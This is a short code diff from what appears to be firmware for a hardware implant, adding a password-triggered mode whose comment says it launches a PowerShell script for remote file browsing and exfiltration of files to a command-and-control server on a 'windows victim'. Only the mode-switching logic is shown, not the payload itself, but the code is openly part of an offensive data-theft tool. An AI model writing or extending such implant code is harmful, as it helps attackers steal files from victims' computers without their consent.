@@ -410,7 +410,18 @@ void setMode(String pass){
       exfilStart(pass);
       Serial1.flush();
       }
-
+        else if (pass == exfilPWSD){
+    // launch a powershell script that allows remote file browsing and exfil to C2 of files on a windows victim
+    Serial.println("EXFIL SD ON");
+    exfilStartVarSD = true;
+    Serial1.flush();
+    }
+       else if (exfilStartVarSD == true) {
+      exfilStartVarSD = false;
+      exfilStartSD(pass);
+      Serial1.flush();
+      }
+    
    else if (pass == exfilPWOFF){
     // exit gracefully from exfil mode if the function crashes or the user CTRL+C
     Serial.println("EXFIL OFF");
